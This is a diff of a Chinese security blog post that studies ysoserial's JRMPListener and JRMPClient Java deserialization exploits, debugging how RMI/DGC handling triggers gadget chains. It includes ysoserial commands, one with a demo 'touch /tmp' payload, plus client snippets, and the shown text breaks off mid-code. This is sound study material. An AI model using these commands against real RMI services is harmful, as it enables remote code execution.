@@ -1,1 +1,604 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/favicon.ico"><script type="module" crossorigin src="/static/js/120aa8f8.js"></script><link rel="stylesheet" href="/static/css/a14e1a22.css"><!-- hexo injector head_end start --><script rel="prefetch" async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script rel="preload" src="https://unpkg.com/blueimp-md5@^2.19.0/js/md5.min.js"></script><script rel="preload" src="https://unpkg.com/lodash@^4.17.21/lodash.min.js"></script><link rel="stylesheet" href="https://fonts.loli.net/css?family=Rubik" /><script rel="preload" src="https://unpkg.com/gitalk@^1.8.0/dist/gitalk.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk@^1.8.0/dist/gitalk.css"/><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body id="body-container"><noscript><strong>We're sorry but this app doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div></body></html>
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="stoocea" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="time thicking away" />
+  
+  
+  
+  <title>
+    
+      Ysoserial-JRMPListener/JRMPClient学习 
+      
+      
+      |
+    
+     stoocea&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://bu.dusays.com/2024/08/09/66b6003e9e298.png">
+    <link rel="icon" href="https://bu.dusays.com/2024/08/09/66b6003e9e298.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://bu.dusays.com/2024/08/09/66b609e582b55.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Stoocea</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Ysoserial-JRMPListener/JRMPClient学习</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-08-09 18:24:25
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/JRMP/" title="JRMP">
+                    #JRMP
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="RMI-过程回顾"><a href="#RMI-过程回顾" class="headerlink" title="RMI 过程回顾"></a>RMI 过程回顾</h1><p>回顾一下 RMI 的流程，算是复习。我们就拿一段示例代码来举例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">RemoteObject</span>();</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>,remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>JDK 版本稍微高一点之后，Registry 和 Server 端必须要在同一台机器上才能创建成功。<br>总共分为 3 步走，</p>
+<ol>
+<li>创建注册中心</li>
+<li>创建远程对象</li>
+<li>绑定远程对象</li>
+</ol>
+<p>再看一段 Client 端对 Registry 端和 Server 端通信示例代码 </p>
+<ol>
+<li>通过 IP 端口获取到注册中心</li>
+<li>在通过调用注册中心的 lookup 方法，根据远程对象的 name 来获取到远程对象</li>
+<li>调用其方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//通过getRegistry获取到注册中心</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        System.out.println(Arrays.toString(registry.list()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//然后通过Client端的Stub代理类发送一个远程对象以及方法的请求调用</span></span><br><span class="line">        <span class="comment">//这里我们通过注册中心拿到对应的远程对象，然后调用其方法</span></span><br><span class="line">        RemoteInterface stub=(RemoteInterface) registry.lookup(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        System.out.println(stub.sayHello(<span class="keyword">new</span> <span class="title class_">EvilClass</span>().getEvil()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+客户端和服务端的概念其实不是固定的，只需要明确谁往目标发送请求获取数据，谁就是 Client 客户端，而提供这些数据的目标就是 Server 服务端。如果按照这么来看，那我们自己恶意服务器上开的 JRMPListener，其实就相当于服务端，目标向我们恶意服务器发送一个 JRMP 请求，比如调用 naming.lookup 这种方法，就会得到一串序列化结果，客户端会在本地将其反序列化。<br>参考过程 7 或 9，都会在 Client 进行一段对请求到数据的反序列化操作<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1707740600543-c50d2cc5-cb74-4562-8865-aadf7931ca5f.png?x-oss-process=image/format,webp/resize,w_1289,limit_0#averageHue=%23a8a6a6&from=url&id=e2ZjM&originHeight=605&originWidth=1289&originalType=binary&ratio=1.875&rotation=0&showTitle=false&status=done&style=none&title=" referrerpolicy="no-referrer"></li>
+</ol>
+<h1 id="JRMPListener-调试"><a href="#JRMPListener-调试" class="headerlink" title="JRMPListener 调试"></a>JRMPListener 调试</h1><p>根据上图，我们其实可以将整个 JRMPListener 利用的过程看作 7 和 8 的过程，也就是客户端 lookup 触发服务查找，然后 JRMP 服务端接收到请求，并在</p>
+<h2 id="初步攻击操作示例"><a href="#初步攻击操作示例" class="headerlink" title="初步攻击操作示例"></a>初步攻击操作示例</h2><p>ysoserial 中提供了 JRMPListener 的 EXP，纯研究的话就是自己本地 idea 按照如下设置启动即可。如果是真实实战或者在 CTF 中，我们可以在自己 VPS 上编译一个 Ysoserial 的项目，然后运行如下命令启动：<br><code>java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections6 &quot;touch /tmp/stoocea&quot;</code><br>idea 设置如下：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720168922421-a58cd082-1239-48e0-be67-17ed15533674.png#averageHue=%23303336&clientId=ufd5d1ab4-ba12-4&from=paste&height=598&id=uf197016d&originHeight=1121&originWidth=1359&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=132057&status=done&style=none&taskId=ub73e33b1-bac7-4ef9-b94d-051c77987ab&title=&width=724.8" referrerpolicy="no-referrer" alt="image.png"><br>然后我们再写一个客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JRMPTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:7777/whateverYouWant&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720168974595-07a355f3-da92-4c32-8733-ea37e3f9f38f.png#averageHue=%232e302f&clientId=ufd5d1ab4-ba12-4&from=paste&height=730&id=ub83fa4ac&originHeight=1368&originWidth=2560&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=1268627&status=done&style=none&taskId=ubacff02e-4856-4bf0-b4e8-6559ed44c91&title=&width=1365.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>发现客户端对我们开启的 JRMP 监听端口发送请求后，会在本地进行反序列化操作，触发 CC6。而这个反序列化的过程其实是 触发了 RMI 中的 DGC 机制，而在客户端进行的反序列化<br>这里我们可以两边都打断点进行调试，客户端触发的流程和 RMI 是一样的。</p>
+<h2 id="JRMPListener-逻辑"><a href="#JRMPListener-逻辑" class="headerlink" title="JRMPListener 逻辑"></a>JRMPListener 逻辑</h2><p>但是恶意服务端的逻辑就有所不同了，ysoserial 有自己的逻辑，这一段具体的代码位于 <code>ysoserial.exploit.JRMPListener</code>中，有一段特别熟悉，当前 Listener 进程开始之后调用 run 方法处理 socket 链接，然后初始化一些会用到的数据流，比如 bufferStream 和 outputStream<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720193486037-533c2200-84c6-4f3d-8471-d78177604a7d.png#averageHue=%23363930&clientId=ua6b13fb7-5313-4&from=paste&height=453&id=u5158e1b2&originHeight=849&originWidth=2070&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=872584&status=done&style=none&taskId=ue5bd735f-951c-4d6b-a957-c466e3c23f7&title=&width=1104" referrerpolicy="no-referrer" alt="image.png"><br>然后根据当前接收到的客户端请求过来的数据流判断使用的协议类型，比如我们此时客户端是通过 naming.lookup 方法的执行发送过来的请求信息，所以这里 protocol 的值为 75，在 Java RMI 调用过程中代表 JRMP 协议，那么他会进入<code>case TransportConstants.StreamProtocol</code>的选项，并且执行完逻辑。然后由于此时该情况并没有加 break 语句，所以还是会执行<code>case TransportConstants.SingleOpProtocol:</code>所对应的逻辑：<code>**doMessage(s, in, out, this.payloadObject);**</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720193085708-d56adc7f-8dcb-474b-ba6d-08e7f54e7622.png#averageHue=%23333531&clientId=ua6b13fb7-5313-4&from=paste&height=373&id=udef8f193&originHeight=700&originWidth=1887&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=610363&status=done&style=none&taskId=u5616ba53-68ae-416e-8cc7-83265d06261&title=&width=1006.4" referrerpolicy="no-referrer" alt="image.png"><br>domessage 里面的内容是根据 op 操作的值来进入 switch case 执行逻辑的，获取的 OP 来自于客户端的请求信息<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720193092586-e623478e-df99-4d41-b385-74a74e0239ce.png#averageHue=%23363f34&clientId=ua6b13fb7-5313-4&from=paste&height=278&id=u36376a3b&originHeight=522&originWidth=1925&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=442912&status=done&style=none&taskId=ue6ef73c9-8134-4ce2-ad1c-7d64f1fbbd7&title=&width=1026.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里跟 Registry 端处理客户端请求的逻辑是很像的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720193881559-00c82576-f80d-40a6-a983-a16a90cca30a.png#averageHue=%237b7b7a&clientId=ua6b13fb7-5313-4&from=paste&height=245&id=u27f73429&originHeight=460&originWidth=1720&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=119744&status=done&style=none&taskId=u9a892d8b-7c51-413f-a4bd-a30d0dda224&title=&width=917.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>而在 docall 方法中就是将恶意对象序列化，并且将序列化数据写入通信流，等待客户端接收<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720233603949-369fda51-ad3e-467c-b04e-2747b2d74587.png#averageHue=%23333c35&clientId=u89804289-175c-4&from=paste&height=501&id=u6f0489e3&originHeight=940&originWidth=1697&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=740726&status=done&style=none&taskId=u5f674354-1395-499a-b0f6-34ef5cc2bd1&title=&width=905.0666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
+<h2 id="被攻击客户端逻辑"><a href="#被攻击客户端逻辑" class="headerlink" title="被攻击客户端逻辑"></a>被攻击客户端逻辑</h2><p>先启动 JRMPListener，然后在<code>naming.lookup</code>处打个断点，然后跟进。（其实这里是可以双向打断点跟进的，只不过我觉得分开来比较清晰一点）<br>跟进<code>naming.lookup</code><br>初步根据 Ip port 等信息创建 <code>RegitryImpl_Stub</code>，然后调用<code>RegitryImpl_Stub</code> 的 lookup<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720234889712-56d72b72-da6c-4be0-adac-096482afe0a3.png#averageHue=%23404d40&clientId=ud3a01fc2-29ec-4&from=paste&height=330&id=u65bacb0c&originHeight=619&originWidth=1951&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=555627&status=done&style=none&taskId=u0b70e8b1-ad33-4a1a-bc15-dc090ea0510&title=&width=1040.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>Stub 的 invoke，首先调用 newcall 建立与 JRMP 服务端的连接。也就是这一步走完服务端那边才接收到的 protocol 是 75，可以看作是 JRMP 协议握手的环节。<br>然后将我们的请求信息，包括请求的远程对象的 name 等等信息都序列化写进当前请求流<code>var3.writeObject(var1);</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720235811394-64685cbf-89d9-4ea7-9275-636b147aa427.png#averageHue=%23484d40&clientId=ud3a01fc2-29ec-4&from=paste&height=345&id=ub7498dfc&originHeight=646&originWidth=1703&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=501750&status=done&style=none&taskId=u7c6b80ef-e38a-4c71-9ec5-cde94e73755&title=&width=908.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>然后调用 unicastRef 的 invoke 方法，这里的 Var1 是 StreamRemoteCall ，所以继续跟进StreamRemoteCall 的 executeCall 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720237082400-141afd9e-9910-40c5-afc8-cef5f53c2920.png#averageHue=%233e4538&clientId=ud3a01fc2-29ec-4&from=paste&height=336&id=u737645d9&originHeight=630&originWidth=1561&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=504551&status=done&style=none&taskId=u5b6a53c6-7bd9-40b8-9139-7371e70d47c&title=&width=832.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>代码量较大，一部分一部分来<br>首先获取当前通信流的 DGC 确认消息，看看当前请求到的这个远程对象是否需要被 DGC 掉，那很明显我们首次请求肯定不会，那么将该信息 releaseOutputStream 出去，告诉服务端。<br>之后开始再向服务端那里获取到请求到的远程对象数据流（其实这里就是我们的恶意对象流了）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720237176218-466bdab3-5802-4efb-927b-725546af5fdf.png#averageHue=%23383d34&clientId=ud3a01fc2-29ec-4&from=paste&height=375&id=uf0e9100b&originHeight=703&originWidth=1759&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=575511&status=done&style=none&taskId=ud1f3f7b8-2c1e-45a7-808e-3c516f0b24a&title=&width=938.1333333333333" referrerpolicy="no-referrer" alt="image.png"><br>readByte 获取序列化字节的具体消息，然后 readID 一下，这里的 ID 是判断我们是否正确的请求到了远程对象，过程是否有差错。<br>之后就是一段 switch 来反序列化该恶意对象了，走过 readObject，即可完成攻击<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720237805666-4d54d803-95cb-43da-a54f-df46aed41b76.png#averageHue=%232e332d&clientId=ud3a01fc2-29ec-4&from=paste&height=171&id=ufb39dfbd&originHeight=321&originWidth=1801&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=256785&status=done&style=none&taskId=u807a02c0-a64e-4497-9053-d80331cdefc&title=&width=960.5333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实就服务端需要 yoserial 的伪造，所以代码跟进多一点，客户端被攻击的过程其实就是跟我们初次学习 RMI 中攻击客户端的逻辑是差不多的。只不过我们刚开学的那会，并没有具体说怎么打，只是把客户端被攻击的流程过了一遍，并不知道该如何去利用，那这次就是通过伪造 JRMP 恶意服务端，向客户端发送恶意对象的序列化数据完成的攻击。很有实战意义。</p>
+<h1 id="JRMPClient-调试"><a href="#JRMPClient-调试" class="headerlink" title="JRMPClient 调试"></a>JRMPClient 调试</h1><p>既然我们构造的是恶意 Client，并且具体的攻击点是 DGC 的话，那可以确定就是直接攻击 Server 端了，因为 DGC 的 Stub 和 Skel 本身都是存在于服务端的，作用是用来确定客户端还在不在使用当前这个远程对象，如果没有使用就把他垃圾回收并清除内存。</p>
+<h2 id="DGC-创建过程"><a href="#DGC-创建过程" class="headerlink" title="DGC 创建过程"></a>DGC 创建过程</h2><p>所以，我觉得有必要回顾一下 DGC 的创建过程：<br>在远程对象实例化的时候，我们一路走到 TCPTransport 的 exportObject 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720246131918-798019fc-8f95-47ba-8409-16026873e452.png#averageHue=%23323b32&clientId=ue8a12690-ad03-4&from=paste&height=485&id=u577df07e&originHeight=910&originWidth=1496&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=606924&status=done&style=none&taskId=udc1db323-f96b-4638-a519-855b455dd5c&title=&width=797.8666666666667" referrerpolicy="no-referrer" alt="image.png"><br>在调用完 listen 方法，创建一个 socket 等待注册中心（在本次攻击中也可以叫做客户端了）发送数据之后，会调用一次 Transport 的 exportObject 方法，我们跟进<br>set 的方法就不看了，我们走进 putTarget 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720246207396-fd14d66f-f71c-441a-acbb-3d3e590d177f.png#averageHue=%23343831&clientId=ue8a12690-ad03-4&from=paste&height=125&id=ub68d644d&originHeight=234&originWidth=1363&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=164598&status=done&style=none&taskId=udedecc0f-408f-4ebf-bcaf-3d79f885b3e&title=&width=726.9333333333333" referrerpolicy="no-referrer" alt="image.png"><br>在 putTarget 方法中调用到了 DGCImpl 的静态变量，那么此时会完成 DGCImpl 类的初始化，那么就一定会执行到其静态代码块，跟进<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720247084094-4ed3b397-3969-4b41-a0e8-9833661e20ee.png#averageHue=%23262827&clientId=ue8a12690-ad03-4&from=paste&height=534&id=ud7a72a41&originHeight=1001&originWidth=1862&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=804873&status=done&style=none&taskId=udf9fc215-e216-43d1-a6f5-e5f4669e4a0&title=&width=993.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>多开一条线程用来创建一条 DGCImpl_Skel，DGCImpl_Stub,相当于是创建了一个新的远程对象，并且将其 put 到了 ObjectTable 中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720247200199-55d9e239-4c30-4e4b-adb7-5637faed9124.png#averageHue=%23354136&clientId=ue8a12690-ad03-4&from=paste&height=562&id=ua52854b4&originHeight=1054&originWidth=2143&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=1028687&status=done&style=none&taskId=u161ecd11-a9ce-4ca5-8cdd-4eb9a683c5a&title=&width=1142.9333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
+<h2 id="DGC-处理服务逻辑"><a href="#DGC-处理服务逻辑" class="headerlink" title="DGC 处理服务逻辑"></a>DGC 处理服务逻辑</h2><p>其实也可以看做 DGC 是如何被攻击的逻辑。这里入口点是：服务端通过注册中心的 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code>方法。<br>紧接<code>handleMessages</code>方法中调用到 UnicastServerRef 的 dispatch 方法，而此时 dispatch 方法又会调用到 oldDispatch 方法，前面的具体内容就不跟进了，直接看 oldDispatch<br>获取请求输入流中的数据，逐步获取到 readLong 的时候，这里 JRMPClient 端会提前设置好 Long 区为 <code>objOut.writeLong(-669196253586618813L);</code>也就是 DGC 操作的标识<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720248951330-772caa04-47e8-4c33-a4bc-f956b2354073.png#averageHue=%23363d32&clientId=u33ab5c00-e844-4&from=paste&height=456&id=u3203832f&originHeight=855&originWidth=2178&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=813461&status=done&style=none&taskId=u093d445e-db21-414d-a146-f59bad93ce7&title=&width=1161.6" referrerpolicy="no-referrer" alt="image.png"><br>那么在调用<code>this.skel.dispatch(var1, var2, var3, var4);</code>的时候，跟进的就是 DGCImpl_Skel 的 dispatch 方法了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720249101953-105ff4cb-c0a4-40d8-8407-eff7485b5a35.png#averageHue=%23364236&clientId=u33ab5c00-e844-4&from=paste&height=529&id=u844bdcb3&originHeight=991&originWidth=1703&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=780968&status=done&style=none&taskId=u844fdd42-b528-4a72-b0b8-c905e8756a9&title=&width=908.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里会根据 var3 来选择到底是执行 dirty 操作还是 clean 操作，那么在 JRMPClient 中是设置的 1，也就是会进入 case1，clean 的逻辑<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720249330081-2a854dab-af23-4ac4-b205-3beb2219799c.png#averageHue=%23373e32&clientId=u33ab5c00-e844-4&from=paste&height=478&id=u11d1fd82&originHeight=897&originWidth=1418&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=599068&status=done&style=none&taskId=u0c26d694-0e9f-4a64-a77e-33b25c9ee0f&title=&width=756.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>经过 readObject，触发攻击链<br>上面的流程简单的回顾了一下 DGC 的创建流程，以及服务端在接收到客户端的请求信息之后如何处理的逻辑，相当于是过了一遍 DGC 在服务端是如何被攻击的，接下里看 ysoserial 中的 JRMPClient 是如何构造恶意 Client 的</p>
+<h2 id="JRMPClient-逻辑"><a href="#JRMPClient-逻辑" class="headerlink" title="JRMPClient 逻辑"></a>JRMPClient 逻辑</h2><p>最重要的就是这段 makeDGCCall 方法了，将由它来发送 DGC 请求<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720249231997-18d382ac-8f69-4c89-9500-08f9524b0203.png#averageHue=%23252626&clientId=u33ab5c00-e844-4&from=paste&height=584&id=u36528a7e&originHeight=1095&originWidth=2337&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=1035859&status=done&style=none&taskId=u3a32f4df-e95c-4627-8f8e-db19a59e685&title=&width=1246.4" referrerpolicy="no-referrer" alt="image.png"></p>
+<ul>
+<li>建立 socket 连接，保持通信状态，然后设置 TCP 协议连接</li>
+<li>然后设置 JRMP 连接的通信状态写入数据流</li>
+<li>设置 DGC 的 Long 数据区，以及一些其他无关但是不能为空的数据区</li>
+<li>最后写入恶意反序列化对象的序列化数据</li>
+</ul>
+<p>整体操作还是比较容易理解，到这肯定就想去试试是否能够打成功了，然后就遇到了一个问题：就是什么样的服务端才能被攻击呢？</p>
+<h1 id="JRMPListener-Client-Gadget"><a href="#JRMPListener-Client-Gadget" class="headerlink" title="JRMPListener&#x2F;Client Gadget"></a>JRMPListener&#x2F;Client Gadget</h1><p>这两段 GadGets 存在的意义就在于当我们能够执行反序列化操作的时候，能够利用这两个 GagGets 达到建立被害服务端和被害客户端的操作，具体流程我就不跟了，直接利用：</p>
+<h2 id="JRMPListener"><a href="#JRMPListener" class="headerlink" title="JRMPListener"></a>JRMPListener</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar JRMPListener <span class="number">7777</span>|base64 &gt;<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720250304083-d42134a5-f0b3-4d86-b20c-20d16ade482c.png#averageHue=%230f1419&clientId=u33ab5c00-e844-4&from=paste&height=265&id=ue9dfb4e9&originHeight=497&originWidth=1806&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=173803&status=done&style=none&taskId=u83211ce9-85cc-478b-8d98-fc18f105705&title=&width=963.2" referrerpolicy="no-referrer" alt="image.png"><br>来一个无限循环的 Server 端，来反序列化操作,不然执行完一遍之后其端口开启的状态就没了，具体代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td 